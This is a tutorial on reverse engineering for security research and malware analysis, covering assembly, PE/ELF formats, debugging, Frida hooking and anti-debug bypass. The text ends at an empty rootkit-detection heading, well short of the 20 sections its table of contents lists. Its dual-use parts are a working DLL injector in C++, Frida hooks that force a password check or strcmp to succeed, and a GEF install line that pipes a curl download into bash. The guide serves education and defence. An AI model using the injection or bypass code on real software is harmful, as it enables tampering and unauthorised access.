# 🔍 Complete Reverse Engineering Guide

### From Zero to Security Researcher

> **Who is this for?** You know JavaScript well, you're learning C and Python, and you want to understand how programs work at their deepest level — for ethical hacking, security research, CTFs, and malware analysis.

---

## 📚 Table of Contents

1. [What is Reverse Engineering?](#1-what-is-reverse-engineering)
2. [How a Computer Actually Works](#2-how-a-computer-actually-works)
3. [Number Systems (Binary, Hex, Decimal)](#3-number-systems)
4. [Assembly Language — The Language of Machines](#4-assembly-language)
5. [Stack and Functions in Assembly](#5-stack-and-functions)
6. [Static Analysis — Reading Programs Without Running Them](#6-static-analysis)
7. [File Formats — PE, ELF, Mach-O](#7-file-formats)
8. [Dynamic Analysis — Running and Watching Programs](#8-dynamic-analysis)
9. [Debugging — GDB, x64dbg, WinDbg](#9-debugging)
10. [API Hooking and Instrumentation](#10-api-hooking-and-instrumentation)
11. [Malware Analysis](#11-malware-analysis)
12. [Anti-Debugging and Anti-Analysis Bypass](#12-anti-debugging-and-anti-analysis-bypass)
13. [Kernel and Rootkit Analysis](#13-kernel-and-rootkit-analysis)
14. [Firmware and IoT Reverse Engineering](#14-firmware-and-iot-reverse-engineering)
15. [Mobile Reverse Engineering (Android & iOS)](#15-mobile-reverse-engineering)
16. [Game Hacking](#16-game-hacking)
17. [Exploit Development](#17-exploit-development)
18. [Tools Reference](#18-tools-reference)
19. [Practice Platforms](#19-practice-platforms)
20. [Career Paths and Resources](#20-career-paths-and-resources)

---

## 1. What is Reverse Engineering?

Imagine you buy a locked box. You don't have the manual. Reverse engineering means figuring out how it works **from the outside** — by looking, listening, and testing it.

In software, reverse engineering means:

- Taking a compiled program (just 0s and 1s)
- Figuring out what it does, how it works, and sometimes why

### Why Do Security People Learn This?

| Use Case                   | Description                             |
| -------------------------- | --------------------------------------- |
| **Malware Analysis**       | Understand what a virus/trojan does     |
| **Vulnerability Research** | Find bugs before attackers do           |
| **CTF Competitions**       | Solve hacking challenges and win prizes |
| **Penetration Testing**    | Test if a company's software is secure  |
| **Firmware Analysis**      | Inspect IoT device software             |
| **Digital Forensics**      | Investigate cyber crimes                |

### The RE Process (Simple View)

```
You have a binary file (.exe, .apk, etc.)
         ↓
Step 1: STATIC ANALYSIS
   → Look at it without running it
   → Read strings, imports, file structure
         ↓
Step 2: DYNAMIC ANALYSIS
   → Run it in a safe environment
   → Watch what it does (files, network, registry)
         ↓
Step 3: DISASSEMBLY / DECOMPILATION
   → Convert binary to assembly or pseudo-C
   → Understand the logic
         ↓
Step 4: DOCUMENT FINDINGS
   → Write report, extract IOCs, create signatures
```

---

## 2. How a Computer Actually Works

Before you reverse engineer anything, you must understand how the machine thinks.

### The CPU and Memory

Think of your computer like this:

```
┌─────────────────────────────────────┐
│            CPU (Brain)              │
│  ┌────────────┐  ┌────────────────┐ │
│  │  Control   │  │  Math Unit     │ │
│  │  Unit      │  │  (ALU)         │ │
│  └────────────┘  └────────────────┘ │
│                                     │
│  Registers: tiny super-fast storage │
│  (RAX, RBX, RCX, RDX, RSP, RBP...) │
└─────────────────────────────────────┘
              ↕ talks to
┌─────────────────────────────────────┐
│              RAM (Memory)           │
│  ┌──────────────────────────────┐   │
│  │  Code Section  (.text)       │   │
│  │  The actual program          │   │
│  ├──────────────────────────────┤   │
│  │  Data Section  (.data)       │   │
│  │  Global variables            │   │
│  ├──────────────────────────────┤   │
│  │  Heap                        │   │
│  │  Dynamic memory (malloc)     │   │
│  │  Grows ↑ upward              │   │
│  ├──────────────────────────────┤   │
│  │  Stack                       │   │
│  │  Local variables, calls      │   │
│  │  Grows ↓ downward            │   │
│  └──────────────────────────────┘   │
└─────────────────────────────────────┘
```

### What are Registers?

Registers are like variables that live **inside the CPU** — they are extremely fast. Each one holds one value at a time.

| Register | Full Name           | Common Use                        |
| -------- | ------------------- | --------------------------------- |
| `RAX`    | Accumulator         | Return values from functions      |
| `RBX`    | Base                | General purpose                   |
| `RCX`    | Counter             | Loop counters                     |
| `RDX`    | Data                | Multiplication/division           |
| `RSI`    | Source Index        | String/memory operations          |
| `RDI`    | Destination         | String/memory operations          |
| `RSP`    | Stack Pointer       | Points to top of stack            |
| `RBP`    | Base Pointer        | Points to base of stack frame     |
| `RIP`    | Instruction Pointer | Points to NEXT instruction to run |

> **Think of it like JavaScript variables, but there are only about 16 of them, they're shared by everything, and they're built into the processor chip itself.**

### How Function Calls Work

When `main()` calls `add(5, 10)`:

1. Arguments are put into registers (or pushed to stack)
2. The current address (return address) is saved
3. CPU jumps to `add()` function
4. `add()` runs, puts result in `RAX`
5. CPU jumps back to `main()` using saved return address

This is the **key** to many exploits — if you can corrupt the saved return address, you control where the CPU goes next.

---

## 3. Number Systems

Computers only understand binary (1s and 0s). But we use **hexadecimal (hex)** to represent binary more compactly because it's shorter to read.

### Decimal → Binary → Hex

```
Decimal  Binary      Hex
0        00000000    0x00
1        00000001    0x01
10       00001010    0x0A
15       00001111    0x0F
16       00010000    0x10
42       00101010    0x2A
255      11111111    0xFF
256      100000000   0x100
```

### Why Hex?

- 1 hex digit = 4 binary bits (called a **nibble**)
- 2 hex digits = 1 byte (8 bits)
- `0xFF` is much easier to read than `11111111`

### Memory Addresses

In a 64-bit system, memory addresses look like:

```
0x00007ffee4b1a2c0   ← this is a stack address
0x0000000000401000   ← this is a code address
```

### Data Sizes

| Type             | Size             | Example              |
| ---------------- | ---------------- | -------------------- |
| `char`           | 1 byte           | `'A'` = `0x41`       |
| `short`          | 2 bytes          | `0x00FF`             |
| `int`            | 4 bytes          | `0x0000FFFF`         |
| `long / pointer` | 8 bytes (64-bit) | `0x00007FFF00001234` |

### Endianness — The Tricky Part

When a number is stored in memory, do you store the big end first or the little end first?

```
The number: 0x12345678

Big-endian (network order):
Memory: [12] [34] [56] [78]

Little-endian (x86/x64 — most PCs):
Memory: [78] [56] [34] [12]
```

> **Why care?** When you read raw memory in a debugger, you'll see bytes in little-endian order. `0x78 0x56 0x34 0x12` in memory = the number `0x12345678`. Don't get confused!

---

## 4. Assembly Language

Assembly is the lowest level of human-readable code. Each assembly instruction maps to exactly one or a few CPU operations.

### Your First Assembly Concepts

Think of assembly like this JavaScript analogy:

```
JavaScript:  let x = 5;
Assembly:    mov eax, 5       ; put 5 into register eax

JavaScript:  x = x + 10;
Assembly:    add eax, 10      ; add 10 to eax

JavaScript:  if (x == 15)
Assembly:    cmp eax, 15      ; compare eax with 15
             je  label        ; jump if equal (== in JS)
```

### Essential x86/x64 Instructions

#### Moving Data

```nasm
mov  eax, 5          ; eax = 5          (like: let eax = 5)
mov  eax, ebx        ; eax = ebx        (like: eax = ebx)
mov  eax, [ebx]      ; eax = *ebx       (like: eax = memory[ebx])
lea  eax, [ebx+8]    ; eax = address of (ebx + 8)
```

> **`[brackets]` mean "go to that memory address and read/write there."**
> It's like dereferencing a pointer in C: `*ptr`

#### Math Operations

```nasm
add  eax, 10         ; eax = eax + 10
sub  eax, 5          ; eax = eax - 5
inc  eax             ; eax++
dec  eax             ; eax--
mul  ebx             ; eax = eax * ebx  (unsigned)
imul ebx             ; eax = eax * ebx  (signed)
div  ebx             ; eax = eax / ebx, remainder in edx
```

#### Logical Operations

```nasm
and  eax, 0xFF       ; eax = eax & 0xFF   (bitwise AND)
or   eax, 0x01       ; eax = eax | 0x01   (bitwise OR)
xor  eax, eax        ; eax = 0            (XOR with itself = 0, very common trick!)
not  eax             ; eax = ~eax         (flip all bits)
shl  eax, 2          ; eax = eax << 2     (shift left = multiply by 4)
shr  eax, 2          ; eax = eax >> 2     (shift right = divide by 4)
```

#### Comparisons and Jumps

```nasm
cmp  eax, 10         ; compare eax with 10 (sets flags, doesn't change eax)
test eax, eax        ; AND eax with itself (common way to check if zero)

je   label           ; jump if equal      (if eax == 10)
jne  label           ; jump if not equal  (if eax != 10)
jg   label           ; jump if greater    (if eax > 10, signed)
jl   label           ; jump if less       (if eax < 10, signed)
ja   label           ; jump if above      (unsigned greater than)
jb   label           ; jump if below      (unsigned less than)
jmp  label           ; unconditional jump (always jump)
```

#### Stack Operations

```nasm
push eax             ; put eax on top of stack, RSP decreases by 8
pop  ebx             ; take from top of stack into ebx, RSP increases by 8
```

#### Function Calls

```nasm
call my_function     ; push return address, jump to my_function
ret                  ; pop return address, jump back
```

### Recognizing C Code in Assembly

This is the most important skill. You need to look at assembly and say "oh, this is a for loop" or "this is an if-else."

#### If-Else Statement

```c
// C code:
if (x == 5) {
    y = 1;
} else {
    y = 0;
}
```

```nasm
; Assembly equivalent:
cmp  eax, 5          ; compare x with 5
jne  else_block      ; if NOT equal, jump to else
  mov ebx, 1         ; y = 1 (if block)
  jmp end_if
else_block:
  mov ebx, 0         ; y = 0 (else block)
end_if:
  ; continues here
```

#### While Loop

```c
// C code:
while (counter > 0) {
    counter--;
}
```

```nasm
; Assembly equivalent:
loop_start:
    cmp  ecx, 0      ; compare counter with 0
    jle  loop_end    ; if counter <= 0, exit loop
    dec  ecx         ; counter--
    jmp  loop_start  ; go back to top
loop_end:
```

#### For Loop

```c
// C code:
for (i = 0; i < 10; i++) {
    // do something
}
```

```nasm
; Assembly equivalent:
xor  ecx, ecx        ; i = 0
for_start:
    cmp  ecx, 10     ; compare i with 10
    jge  for_end     ; if i >= 10, exit
    ; loop body here
    inc  ecx         ; i++
    jmp  for_start
for_end:
```

#### Function Call Patterns

When you see this in a disassembler, you know it's a function:

```nasm
; Function prologue (start of function):
push rbp             ; save old base pointer
mov  rbp, rsp        ; set new base pointer
sub  rsp, 0x20       ; allocate space for local variables

; Function body...

; Function epilogue (end of function):
mov  rsp, rbp        ; restore stack pointer
pop  rbp             ; restore base pointer
ret                  ; return to caller
```

---

## 5. Stack and Functions

### What is the Stack?

The stack is a region of memory used for:

- Local variables
- Function arguments
- Return addresses (where to go back after function ends)

It works like a stack of plates — Last In, First Out (LIFO).

### Stack Frame Layout

When a function is called, a new **stack frame** is created:

```
High Address
┌─────────────────────┐
│  Argument 2         │  ← pushed by caller
├─────────────────────┤
│  Argument 1         │  ← pushed by caller
├─────────────────────┤
│  Return Address     │  ← pushed by CALL instruction
├─────────────────────┤
│  Saved RBP          │  ← pushed by function prologue
├─────────────────────┤  ← RBP points here
│  Local Variable 1   │  ← [rbp - 8]
├─────────────────────┤
│  Local Variable 2   │  ← [rbp - 16]
├─────────────────────┤  ← RSP points here (top of stack)
Low Address
```

### Calling Conventions (How Arguments are Passed)

Different platforms pass function arguments differently. You need to know this when reading disassembly.

**Linux/Mac 64-bit (System V AMD64):**

- First 6 arguments: `RDI, RSI, RDX, RCX, R8, R9`
- More arguments: pushed to stack
- Return value: `RAX`

```nasm
; int add(int a, int b) called with add(5, 10)
mov  rdi, 5          ; first argument
mov  rsi, 10         ; second argument
call add
; result is in RAX
```

**Windows 64-bit:**

- First 4 arguments: `RCX, RDX, R8, R9`
- More arguments: pushed to stack
- Return value: `RAX`

---

## 6. Static Analysis

Static analysis means examining a file **without running it**. It's safe, and it gives you a lot of information quickly.

### Step 1 — Basic Triage (First Look)

Before opening any tool, gather basic facts:

```bash
# What type of file is it?
file suspicious.exe

# Calculate hashes (to look up on VirusTotal)
md5sum suspicious.exe
sha256sum suspicious.exe

# Extract all readable strings
strings suspicious.exe > strings.txt

# Look for interesting strings
grep -i "http\|ftp\|password\|registry\|key" strings.txt
```

What to look for in strings:

- **URLs and IP addresses** → network communication
- **File paths** → what files it touches
- **Registry keys** → persistence, settings
- **Error messages** → hints about functionality
- **API names** → what Windows functions it calls

### Step 2 — Using a Disassembler

A disassembler converts raw binary back into assembly instructions. The most popular ones are:

| Tool             | Cost       | Best For                           |
| ---------------- | ---------- | ---------------------------------- |
| **Ghidra**       | Free (NSA) | Best free option, great decompiler |
| **IDA Pro**      | Expensive  | Industry standard                  |
| **Binary Ninja** | Mid-price  | Modern UI, great scripting         |
| **radare2**      | Free       | Command line power users           |

**Using Ghidra (Beginner-Friendly Steps):**

1. Open Ghidra → New Project → Import File
2. Let it auto-analyze (takes a minute)
3. Open the **Symbol Tree** on the left — find `main`
4. Double-click `main` to see disassembly
5. The **Decompiler** window on the right shows pseudo-C code
6. Use **Ctrl+Shift+G** to jump to any address

**Ghidra Shortcuts:**

```
L          → Rename a variable or function
;          → Add a comment
Ctrl+L     → Change variable type
F          → Create a function
Ctrl+E     → Edit function signature
```

### Step 3 — Analyzing Imports

Imports tell you EVERYTHING a program might do, before you even run it:

```python
import pefile

pe = pefile.PE('suspicious.exe')

# Print all imported functions
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    dll_name = entry.dll.decode()
    for imp in entry.imports:
        if imp.name:
            print(f"{dll_name}: {imp.name.decode()}")
```

**Suspicious API Functions to Watch For:**

| API                  | What It Does                       |
| -------------------- | ---------------------------------- |
| `CreateRemoteThread` | Inject code into another process   |
| `WriteProcessMemory` | Write to another process's memory  |
| `VirtualAllocEx`     | Allocate memory in another process |
| `URLDownloadToFile`  | Download a file from internet      |
| `RegSetValueEx`      | Write to Windows registry          |
| `CreateService`      | Install a Windows service          |
| `GetAsyncKeyState`   | Read keystrokes (keylogger!)       |
| `CryptEncrypt`       | Encrypt data (ransomware!)         |

### Step 4 — YARA Rules (Pattern Matching)

YARA is a tool that lets you write rules to detect malware based on patterns.

```yara
// Example: Detect a simple ransomware
rule Ransomware_Detector {
    meta:
        description = "Detects ransomware patterns"
        author      = "You"

    strings:
        // Look for crypto API calls
        $crypto1 = "CryptEncrypt" ascii
        $crypto2 = "CryptGenKey"  ascii

        // Look for ransomware note keywords
        $ransom1 = "bitcoin"      ascii nocase
        $ransom2 = "your files"   ascii nocase
        $ransom3 = ".locked"      ascii

    condition:
        // Must be a PE file AND have crypto AND have ransom strings
        uint16(0) == 0x5A4D and     // PE file magic (MZ)
        2 of ($crypto*) and
        1 of ($ransom*)
}
```

Run it:

```bash
yara ransomware_detector.yar suspicious.exe
```

---

## 7. File Formats

Programs come in different formats depending on OS. You need to know the structure to properly analyze them.

### PE Format (Windows .exe / .dll)

Every Windows executable has this structure:

```
┌───────────────────────────────┐
│  DOS Header                   │
│  Magic bytes: "MZ" (0x5A4D)   │
│  Offset to PE header          │
├───────────────────────────────┤
│  PE Signature: "PE\0\0"        │
├───────────────────────────────┤
│  COFF Header                  │
│  Machine type, # of sections  │
│  Compilation timestamp        │
├───────────────────────────────┤
│  Optional Header              │
│  Entry point address          │
│  Image base address           │
│  Import/Export table offsets  │
├───────────────────────────────┤
│  Section Table                │
│  .text  → code                │
│  .data  → global variables    │
│  .rdata → read-only data      │
│  .rsrc  → resources (icons)   │
├───────────────────────────────┤
│  Section Data (actual content)│
└───────────────────────────────┘
```

**Parsing a PE file with Python:**

```python
import pefile
import math
from collections import Counter

def analyze_pe(filename):
    pe = pefile.PE(filename)

    print("=== PE ANALYSIS ===")
    print(f"Entry Point:  {hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint)}")
    print(f"Image Base:   {hex(pe.OPTIONAL_HEADER.ImageBase)}")
    print(f"Compile Time: {pe.FILE_HEADER.dump_dict()['TimeDateStamp']['Value']}")

    print("\n=== SECTIONS ===")
    for section in pe.sections:
        name = section.Name.decode().strip('\x00')

        # Calculate entropy (7+ = likely packed/encrypted)
        data = section.get_data()
        counter = Counter(data)
        length = len(data)
        entropy = -sum((c/length) * math.log2(c/length)
                       for c in counter.values() if c > 0)

        flags = []
        if section.Characteristics & 0x20000000: flags.append("EXECUTE")
        if section.Characteristics & 0x40000000: flags.append("READ")
        if section.Characteristics & 0x80000000: flags.append("WRITE")

        print(f"\n  [{name}]")
        print(f"    Virtual Address: {hex(section.VirtualAddress)}")
        print(f"    Size:            {hex(section.SizeOfRawData)}")
        print(f"    Entropy:         {entropy:.2f}  {'⚠ HIGH (packed?)' if entropy > 7 else 'OK'}")
        print(f"    Flags:           {', '.join(flags)}")

analyze_pe("suspicious.exe")
```

### ELF Format (Linux executables)

Linux programs use ELF format. Key sections:

| Section   | Contains                                    |
| --------- | ------------------------------------------- |
| `.text`   | Executable code                             |
| `.data`   | Initialized global variables                |
| `.bss`    | Uninitialized global variables              |
| `.plt`    | Procedure Linkage Table (for library calls) |
| `.got`    | Global Offset Table (resolved addresses)    |
| `.symtab` | Symbol table (function names)               |

**Quick ELF analysis:**

```bash
# Basic info
file program
readelf -h program      # Header info
readelf -l program      # Program headers (segments)
readelf -S program      # Section headers
readelf -s program      # Symbol table
nm program              # Symbols with types
objdump -d program      # Disassemble
ldd program             # Library dependencies
strings program         # Strings
```

### Understanding PLT/GOT (Important for Exploitation!)

When a Linux program calls `printf()`, how does it find `printf` in libc?

```
Program calls printf@plt
     ↓
PLT entry: "jump to GOT[printf]"
     ↓
First time: GOT points back to resolver
     ↓
Resolver: finds printf in libc, writes real address to GOT
     ↓
Next time: GOT already has real address, direct jump
```

This is important because **GOT overwrite** is a common exploitation technique — if you can write to the GOT, you redirect any function call to your shellcode.

---

## 8. Dynamic Analysis

Dynamic analysis means **running the program in a safe, isolated environment** and watching what it does.

### Setting Up a Safe Analysis Lab

**Never run malware on your real machine!** Use virtual machines (VMs).

```
Your Real Computer (Host)
└── VirtualBox / VMware
    ├── Windows VM  ← Run malware here
    │   ├── Network: Host-only (no real internet)
    │   ├── Process Monitor (Sysinternals)
    │   ├── Wireshark
    │   └── Always snapshot before running sample!
    │
    └── Linux VM  ← Analysis tools
        ├── REMnux distro (pre-built for this!)
        └── Ghidra, radare2, Volatility
```

**Download REMnux:** https://remnux.org/
**Download FLARE VM (Windows):** https://github.com/mandiant/flare-vm

### Watching File System Changes

Use **Process Monitor** (Windows) or **strace** (Linux):

```bash
# Linux: trace system calls
strace -o trace.txt ./suspicious_program

# See all file operations
strace -e trace=open,read,write,unlink ./program

# See all network operations
strace -e trace=network ./program
```

**Process Monitor filters (Windows):**

- Process Name: `malware.exe`
- Operation: `WriteFile`, `RegSetValue`, `CreateProcess`

### Watching Network Traffic

**Wireshark filters for malware:**

```
# All HTTP traffic
http

# DNS queries (what domains does it look up?)
dns

# Connections on suspicious ports
tcp.port == 4444 or tcp.port == 6666

# Connections outside local network
!(ip.dst == 192.168.0.0/16 or ip.dst == 10.0.0.0/8)
```

### Simulating the Internet (INetSim)

Malware tries to connect to its C2 (Command and Control) server. Use INetSim to fake it:

```bash
# Install INetSim on Linux VM
sudo apt install inetsim

# It responds to DNS, HTTP, SMTP, etc. as if it were the real internet
# Configure Windows VM to use Linux VM as DNS server
sudo inetsim
```

Now when malware tries to connect to `evil-c2-server.com`, INetSim responds and you can see what data the malware sends!

---

## 9. Debugging

A debugger lets you run a program **one instruction at a time**, inspect memory, and change values.

### GDB (Linux Debugger)

GDB is the standard Linux debugger. Install pwndbg or GEF for a much better experience:

```bash
# Install GEF (better GDB)
bash -c "$(curl -fsSL https://gef.sh/)"

# Start debugging
gdb ./program
gdb --args ./program argument1 argument2
gdb -p 1234      # Attach to running process PID 1234
```

**Essential GDB Commands:**

```bash
# Running
run                      # Start program
run arg1 arg2            # Start with arguments
continue   (c)           # Continue after breakpoint
quit       (q)           # Exit GDB

# Stopping
break main               # Stop when entering main()
break *0x401000          # Stop at specific address
break file.c:42          # Stop at line 42
info breakpoints         # List all breakpoints
delete 1                 # Delete breakpoint #1

# Step-by-step
next       (n)           # Run next line (step OVER function calls)
step       (s)           # Run next line (step INTO function calls)
nexti      (ni)          # Next assembly instruction (step over)
stepi      (si)          # Next assembly instruction (step into)
finish                   # Run until current function returns

# Looking at memory
x/10i $rip               # Show next 10 INSTRUCTIONS at RIP
x/10x $rsp               # Show 10 hex values on STACK
x/20gx $rsp              # Show 20 giant (8-byte) hex values
x/s 0x402000             # Show STRING at address 0x402000
print $rax               # Print value of RAX register
print/x $rax             # Print RAX in hex

# Registers
info registers           # Show ALL registers
info registers rax rbx   # Show specific registers
set $rax = 0x1234        # CHANGE a register value

# Stack and functions
backtrace  (bt)          # Show call stack (which functions called what)
frame 2                  # Switch to stack frame 2
info locals              # Show local variables in current function
info args                # Show function arguments

# Disassembly
disassemble main         # Disassemble the main function
disassemble 0x401000     # Disassemble at address
set disassembly-flavor intel   # Use Intel syntax (easier to read)
```

**Example GDB Session:**

```bash
$ gdb ./password_checker
(gdb) set disassembly-flavor intel
(gdb) break main
(gdb) run
# Program stops at main()
(gdb) disassemble main
# See the assembly code
(gdb) break *0x401234    # Break at the comparison
(gdb) continue
# Program runs to that address
(gdb) info registers     # See register values
(gdb) x/s $rdi           # Read string in RDI (maybe the password!)
(gdb) set $rax = 1       # Force success return value
(gdb) continue           # Continue with modified value
```

### x64dbg (Windows Debugger)

x64dbg is the best free Windows debugger. Download at: https://x64dbg.com

**Key shortcuts:**

```
F2          → Set/remove breakpoint at cursor
F7          → Step into (enters function calls)
F8          → Step over (skips function calls)
F9          → Run until next breakpoint
Ctrl+F9     → Run until current function returns
Ctrl+G      → Go to address
Space       → Assemble (modify instruction)
;           → Add comment
```

**Useful x64dbg workflow:**

1. Load `.exe` → it pauses at entry point
2. Right-click in disassembly → Follow in Dump → to see memory
3. Set breakpoints on interesting APIs: right-click → Toggle Breakpoint
4. Run, inspect, modify values in the Register window on the right

### WinDbg (Windows Kernel Debugger)

WinDbg is Microsoft's debugger. Essential for kernel-level analysis.

```
# Key commands
g                  → Go (continue)
p                  → Step over
t                  → Step into
bp 0x401000        → Breakpoint at address
bp kernel32!CreateFileW  → Breakpoint at Windows API
bl                 → List breakpoints
k                  → Show call stack
lm                 → List loaded modules
!analyze -v        → Analyze crash dump
```

---

## 10. API Hooking and Instrumentation

Hooking means **intercepting a function call** to watch or modify it.

### Frida — The Swiss Army Knife

Frida lets you inject JavaScript into any process and hook any function at runtime. It works on Windows, Linux, macOS, Android, and iOS.

```bash
pip install frida frida-tools
```

**Basic Frida Script:**

```javascript
// hook.js — save this and run with: frida -l hook.js program.exe

// Hook a Windows API function
Interceptor.attach(Module.findExportByName('kernel32.dll', 'CreateFileW'), {
  onEnter: function (args) {
    // args[0] is the filename (wide string)
    var filename = args[0].readUtf16String()
    console.log('[CreateFileW] Opening file: ' + filename)
  },
  onLeave: function (retval) {
    console.log('[CreateFileW] Returned handle: ' + retval)
  },
})

// Hook by memory address (if you found it in Ghidra/IDA)
var base = Module.findBaseAddress('program.exe')
var check_password = base.add(0x1234) // offset from Ghidra

Interceptor.attach(check_password, {
  onEnter: function (args) {
    console.log('[check_password] Called!')
    console.log('  Argument 1: ' + args[0].readUtf8String())
  },
  onLeave: function (retval) {
    console.log('  Original return: ' + retval)
    retval.replace(1) // Force function to return 1 (true/success)
  },
})

// Replace a function entirely
Interceptor.replace(
  Module.findExportByName('libc.so', 'strcmp'),
  new NativeCallback(
    function (str1, str2) {
      console.log('[strcmp] Comparing: ' + str1.readUtf8String() + ' with ' + str2.readUtf8String())
      return 0 // Always return "equal"
    },
    'int',
    ['pointer', 'pointer'],
  ),
)
```

**Running Frida:**

```bash
# Attach to running process
frida -l hook.js -n "program.exe"

# Launch and inject
frida -l hook.js program.exe

# Android app
frida -U -f com.example.app -l hook.js --no-pause
```

### DLL Injection (Windows)

DLL injection puts your code inside another process:

```cpp
// inject.cpp — simplified DLL injector
#include <windows.h>
#include <tlhelp32.h>

bool InjectDLL(DWORD pid, const char* dllPath) {
    // Open target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    // Allocate memory in target process for DLL path
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL,
                        strlen(dllPath)+1,
                        MEM_COMMIT, PAGE_READWRITE);

    // Write DLL path into target process
    WriteProcessMemory(hProcess, remoteMem, dllPath, strlen(dllPath)+1, NULL);

    // Get address of LoadLibraryA (same in all processes)
    LPVOID loadLib = GetProcAddress(
                        GetModuleHandle("kernel32.dll"),
                        "LoadLibraryA");

    // Create a thread in target process that calls LoadLibraryA(dllPath)
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                        (LPTHREAD_START_ROUTINE)loadLib,
                        remoteMem, 0, NULL);

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}
```

---

## 11. Malware Analysis

### The Malware Analysis Workflow

```
Sample received
      ↓
1. SAFE ENVIRONMENT
   Snapshot VM, disconnect real internet, start INetSim
      ↓
2. BASIC STATIC
   Hash it, check VirusTotal, run strings, check PE headers
      ↓
3. BASIC DYNAMIC
   Run it, watch Process Monitor, Wireshark
   What files does it create? What registry keys? What network traffic?
      ↓
4. ADVANCED STATIC
   Disassemble in Ghidra/IDA, understand algorithms
      ↓
5. ADVANCED DYNAMIC
   Debug with x64dbg, hook functions with Frida
      ↓
6. REPORT
   Document IOCs, behaviors, create YARA rules
```

### Common Malware Types and Their Indicators

**Keylogger:**

- Imports: `GetAsyncKeyState`, `SetWindowsHookEx`, `GetForegroundWindow`
- Creates files in `%APPDATA%` to store keylog

**Ransomware:**

- Imports: `CryptEncrypt`, `CryptGenKey`, `FindFirstFile`, `FindNextFile`
- Strings: "bitcoin", "decrypt", ".locked", ".encrypted"
- Traverses all directories, renames files

**RAT (Remote Access Trojan):**

- Creates socket connections to C2 server
- Imports: `CreateProcessA`, `GetDesktopWindow`, `BitBlt` (screen capture)
- Persistence via registry Run key

**Downloader:**

- Imports: `URLDownloadToFile`, `InternetOpen`, `HttpSendRequest`
- Downloads and executes another file

### Extracting Indicators of Compromise (IOCs)

IOCs are pieces of evidence you can use to detect this malware in the future:

```python
import re
import hashlib

def extract_iocs(filename):
    with open(filename, 'rb') as f:
        data = f.read()

    # Calculate hashes
    print("=== HASHES ===")
    print(f"MD5:    {hashlib.md5(data).hexdigest()}")
    print(f"SHA256: {hashlib.sha256(data).hexdigest()}")

    # Extract ASCII strings
    text = data.decode('ascii', errors='ignore')

    print("\n=== NETWORK INDICATORS ===")

    # IPs
    ips = re.findall(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b', text)
    for ip in set(ips):
        parts = ip.split('.')
        if all(0 <= int(p) <= 255 for p in parts):
            print(f"  IP: {ip}")

    # Domains
    domains = re.findall(r'[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text)
    for d in set(domains):
        if len(d) > 4 and '.' in d:
            print(f"  Domain: {d}")

    # URLs
    urls = re.findall(r'https?://[^\s"\'<>]+', text, re.IGNORECASE)
    for url in set(urls):
        print(f"  URL: {url}")

    print("\n=== FILE SYSTEM INDICATORS ===")
    paths = re.findall(r'[C-Z]:\\[^\s"\'<>]+', text)
    for path in set(paths):
        print(f"  Path: {path}")

    registry = re.findall(r'HKEY[_A-Z]+\\[^\s"\'<>]+', text)
    for key in set(registry):
        print(f"  Registry: {key}")

extract_iocs('malware.exe')
```

---

## 12. Anti-Debugging and Anti-Analysis Bypass

Malware authors try to make analysis harder. Here's what they do and how to beat it.

### Anti-Debug Techniques and Bypasses

**Technique 1: IsDebuggerPresent**

```c
// Malware code:
if (IsDebuggerPresent()) {
    exit(0);  // Die if debugged
}
```

Bypass methods:

1. **In x64dbg:** Set a breakpoint on `IsDebuggerPresent`, when it's called, change `RAX` to 0 before it returns
2. **Patch:** Find the `call IsDebuggerPresent` + `test eax,eax` + `jnz exit` pattern, NOP out the jump
3. **Frida:**

```javascript
Interceptor.replace(
  Module.findExportByName('kernel32.dll', 'IsDebuggerPresent'),
  new NativeCallback(
    function () {
      return 0
    },
    'int',
    [],
  ),
)
```

**Technique 2: Timing Checks**

```c
// Malware checks how long something takes
// Debuggers slow things down
DWORD start = GetTickCount();
// ... some code ...
if (GetTickCount() - start > 500) {
    exit(0);  // Too slow = debugger
}
```

Bypass: Patch the jump instruction, or hook `GetTickCount` to always return a constant.

**Technique 3: VM Detection (Trying to Detect Your Analysis VM)**

Common checks:

- Is the CPU a hypervisor? (CPUID check)
- Are VMware/VirtualBox processes running?
- Is the MAC address a VM vendor?

Bypass using **ScyllaHide** plugin for x64dbg — it automatically hides the debugger from most anti-debug checks. Enable it before running suspicious software.

### Unpacking Malware

Packers compress/encrypt malware to hide it from antivirus. The real code only appears in memory at runtime.

**How to unpack (generic method):**

1. Load packed exe in x64dbg
2. It will run the unpacking stub first
3. Set hardware breakpoint on new memory regions (`VirtualAlloc`)
4. When real code appears in memory, dump it
5. Use **Scylla plugin**: IAT Autosearch → Get Imports → Dump → Fix Dump

**Quick UPX unpack:**

```bash
upx -d packed_program.exe
```

### Deobfuscating XOR-Encrypted Strings

A very common technique — strings are XOR-encoded so they don't appear plaintext:

```python
def brute_force_xor(encrypted_data):
    """Try all 256 single-byte XOR keys"""
    for key in range(256):
        decrypted = bytes([b ^ key for b in encrypted_data])

        # Check if result is readable ASCII
        try:
            text = decrypted.decode('utf-8')
            if all(c.isprintable() or c.isspace() for c in text):
                print(f"Key {hex(key)}: {text}")
        except:
            pass

# Example
encrypted = bytes([0x2d, 0x27, 0x24, 0x24, 0x21])
brute_force_xor(encrypted)
# Output: Key 0x4c: "hello"  (0x2d ^ 0x4c = 0x61 = 'h')
```

---

## 13. Kernel and Rootkit Analysis

### What is a Rootkit?

A rootkit operates at kernel level, giving it **total control** of the operating system. It can hide files, processes, and network connections from everything running in user space.

### How Rootkits Hide Things

**DKOM (Direct Kernel Object Manipulation):**

The Windows kernel keeps a linked list of all running processes. A rootkit can remove itself from that list:

```
Normal process list:
[System] ↔ [explorer.exe] ↔ [malware.exe] ↔ [notepad.exe]

After DKOM (rootkit removes itself):
[System] ↔ [explorer.exe] ↔ [notepad.exe]
```

`malware.exe` is still running — it just doesn't appear in Task Manager anymore!

**SSDT Hooking:**

The System Service Descriptor Table (SSDT) maps system call numbers to kernel functions. A rootkit replaces function pointers to intercept everything:

```
Normal: SSDT[NtCreateFile] → nt!NtCreateFile (legitimate)

Hooked: SSDT[NtCreateFile] → rootkit!HookedNtCreateFile
                                    ↓
                              Hide rootkit files, then call original
```

### Detecting Rootkits

